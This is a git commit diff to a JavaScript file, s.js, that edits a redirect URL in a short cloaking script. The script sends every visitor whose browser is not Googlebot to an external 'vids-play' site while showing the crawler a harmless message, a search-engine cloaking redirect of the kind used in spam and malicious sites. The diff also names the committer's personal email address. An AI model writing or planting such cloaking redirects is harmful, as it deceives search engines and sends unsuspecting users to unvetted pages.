db57b741ae26573c262d762ecc380cc148ef1473
Sajid Khan <sajidkhan528193@gmail.com>
2026-07-20 04:40:22 +0600

    Add files via upload

--- s.js
+++ s.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://unavuulagam.in/vids-play/?nantu?";
+  window.location.href = "https://unavuulagam.in/vids-play/?nantu";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("Thanks for visiting my page - Full Videos");
